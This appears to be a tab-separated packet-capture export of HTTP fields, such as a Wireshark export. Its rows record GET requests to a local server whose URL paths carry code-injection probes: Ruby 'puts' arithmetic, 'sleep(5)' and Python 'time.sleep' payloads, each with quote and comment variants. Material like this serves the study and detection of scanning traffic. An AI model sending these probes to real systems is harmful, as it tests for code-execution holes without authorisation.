http.accept	http.accept_encoding	http.accept_language	http.authbasic	http.authcitrix	http.authcitrix.domain	http.authcitrix.password	http.authcitrix.session	http.authcitrix.user	http.authorization	http.bad_header_name	http.cache_control	http.chat	http.chunk_boundary	http.chunk_size	http.chunkd_and_length	http.chunked_trailer_part	http.connection	http.content_encoding	http.content_length	http.content_length_header	http.content_type	http.cookie_pair	http.date	http.decompression_disabled	http.decompression_failed	http.file_data	http.host	http.http2_settings	http.http2_settings_uri	http.last_modified	http.leading_crlf	http.location	http.next_request_in	http.next_response_in	http.notification	http.prev_request_in	http.proxy_authenticate	http.proxy_authorization	http.proxy_connect_host	http.proxy_connect_port	http.referer	http.request	http.request.full_uri	http.request.line	http.request.method	http.request.uri.path	http.request.uri.query	http.request.uri.query.parameter	http.request.version	http.request_in	http.request_number	http.sec_websocket_accept	http.sec_websocket_extensions	http.sec_websocket_key	http.sec_websocket_protocol	http.sec_websocket_version	http.server	http.set_cookie	http.ssl_port	http.subdissector_failed	http.te_and_length	http.te_unknown	http.time	http.tls_port	http.transfer_encoding	http.unknown_header	http.upgrade	http.user_agent	http.www_authenticate	http.x_forwarded_for	http.cookie	http.request.uri
																											192.168.1.106									54						1	http://192.168.1.106/'%3bputs%201889409%2b1889409		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'%3bputs%201889409%2b1889409
																											192.168.1.106									55						1	http://192.168.1.106/'%3bputs%201889409%2b1889409%23		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'%3bputs%201889409%2b1889409%23
																											192.168.1.106									56						1	http://192.168.1.106/%22%3bputs%201889409%2b1889409		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22%3bputs%201889409%2b1889409
																											192.168.1.106									58						1	http://192.168.1.106/%22%3bputs%201889409%2b1889409%23		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22%3bputs%201889409%2b1889409%23
																											192.168.1.106									59						1	http://192.168.1.106/web		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web
																											192.168.1.106									61						1	http://192.168.1.106/web		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/web
																											192.168.1.106									62						1	http://192.168.1.106/sleep(5)%3b		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/sleep(5)%3b
																											192.168.1.106									63						1	http://192.168.1.106/sleep(5)%3b%23		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/sleep(5)%3b%23
																											192.168.1.106									64						1	http://192.168.1.106/'%3bsleep(5)%3b		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'%3bsleep(5)%3b
																											192.168.1.106									65						1	http://192.168.1.106/'%3bsleep(5)%3b%23		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'%3bsleep(5)%3b%23
																											192.168.1.106									66						1	http://192.168.1.106/%22%3bsleep(5)%3b		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22%3bsleep(5)%3b
																											192.168.1.106									67						1	http://192.168.1.106/%22%3bsleep(5)%3b%23		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22%3bsleep(5)%3b%23
																											192.168.1.106									68						1	http://192.168.1.106/import%20time%3btime.sleep(5)%3b		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/import%20time%3btime.sleep(5)%3b
																											192.168.1.106									69						1	http://192.168.1.106/import%20time%3btime.sleep(5)%3b%23		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/import%20time%3btime.sleep(5)%3b%23
																											192.168.1.106									70						1	http://192.168.1.106/'%3bimport%20time%3btime.sleep(5)%3b		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'%3bimport%20time%3btime.sleep(5)%3b
																											192.168.1.106									71						1	http://192.168.1.106/'%3bimport%20time%3btime.sleep(5)%3b%23		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/'%3bimport%20time%3btime.sleep(5)%3b%23
																											192.168.1.106									72						1	http://192.168.1.106/%22%3bimport%20time%3btime.sleep(5)%3b		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22%3bimport%20time%3btime.sleep(5)%3b
																											192.168.1.106									73						1	http://192.168.1.106/%22%3bimport%20time%3btime.sleep(5)%3b%23		GET				HTTP/1.1																			Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.2; Trident/6.0)				/%22%3bimport%20time%3btime.sleep(5)%3b%23
